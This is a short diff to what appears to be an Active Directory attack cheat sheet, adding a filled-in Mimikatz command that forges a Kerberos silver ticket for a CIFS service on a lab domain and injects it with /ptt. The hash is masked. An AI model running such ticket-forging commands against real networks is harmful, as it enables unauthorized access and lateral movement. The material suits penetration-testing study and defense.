@@ -343,6 +343,7 @@ Forging a TGS require machine accound password (key) from the KDC
 ```powershell
 Create a ticket for the service
 kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE
+/kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
 
 Then use the same steps as a Golden ticket
 misc::convert ccache ticket.kirbi
